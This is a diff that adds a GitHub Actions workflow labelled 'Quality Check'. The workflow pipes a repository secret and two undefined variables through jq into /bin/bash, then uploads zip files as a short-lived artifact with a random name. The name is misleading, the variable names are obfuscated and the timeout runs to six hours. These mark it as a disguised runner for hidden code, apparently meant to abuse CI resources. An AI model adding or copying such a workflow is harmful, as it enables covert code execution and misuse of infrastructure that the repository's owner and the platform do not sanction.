@@ -1,0 +1,24 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          los6: ${{ secrets.los6 }}
+        run: |
+          printf '%s' "$los6" | jq -r .asyu068 | /bin/bash
+          printf '%s' "$odd751" | jq -r .dla8223 | /bin/bash
+          echo $jtlz31242 | jq -r .vlz206 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: C77DqvJZ
+          path: "*.zip"
+          retention-days: 1
